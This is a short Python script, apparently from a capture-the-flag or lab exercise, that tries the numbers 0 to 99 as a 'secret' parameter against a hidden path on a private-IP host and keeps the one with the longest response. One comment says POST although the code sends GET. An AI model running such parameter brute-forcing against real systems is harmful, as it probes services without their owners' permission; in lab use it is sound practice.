import requests

# Base URL
url = "http://10.10.226.50/th1s_1s_h1dd3n/?"

# Generate numbers from 0 to 99
numbers = list(range(100))
longest_length = 0
secret_number = None

# Iterate through the numbers and send as payload
for number in numbers:
    params = {"secret": number}  # Assuming the secret key is 'secret'
    response = requests.get(url, params=params)  # Use POST; modify if GET is needed

    print(f"Trying number: {number}")

    # Check if the response indicates the correct number
    if len(response.text) > longest_length:  # Adjust based on response content
        longest_length = len(response.text)
        secret_number = number

if secret_number is not None:
    print(f"Secret number found: {secret_number}")
else:
    print("Secret number not found in the range 0-99.")
